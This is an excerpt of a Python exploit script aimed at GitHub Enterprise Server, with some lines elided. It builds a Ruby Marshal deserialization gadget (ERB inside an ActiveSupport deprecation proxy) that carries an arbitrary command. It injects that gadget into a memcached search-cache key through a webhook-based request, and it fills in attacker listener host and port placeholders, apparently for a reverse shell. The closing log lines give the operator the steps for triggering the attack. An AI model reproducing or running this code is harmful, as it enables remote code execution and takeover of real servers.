...
class exploit:
    def __init__(self, requester, args):
        ...
        marshal_code = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x07:\x0e@instanceo:\x08ERB\x07:\t@srcI"\x1e`{}`\x06:\x06ET:\x0c@linenoi\x00:\x0c@method:\x0bresult'.format(
            cmd
        )
        payload = [
            "",
            "set githubproductionsearch/queries/code_query:857be82362ba02525cef496458ffb09cf30f6256:v3:count 0 60 %d"
            % len(marshal_code),
            marshal_code,
            "",
            "",
        ...
        if args.lhost == None:
            ...
            payload = payload.replace("SERVER_HOST", args.lhost)

        if args.lport == None:
            payload = payload.replace("SERVER_PORT", input("Server Port:"))
        else:
            payload = payload.replace("SERVER_PORT", args.lport)

        logging.info(
            "You need to insert the WebHooks in 'https://ghe-server/:user/:repo/settings/hooks'"
        )
        logging.info(
            "Then make a request to 'https://ghe-server/search?q=ggggg&type=Repositories'"
        )
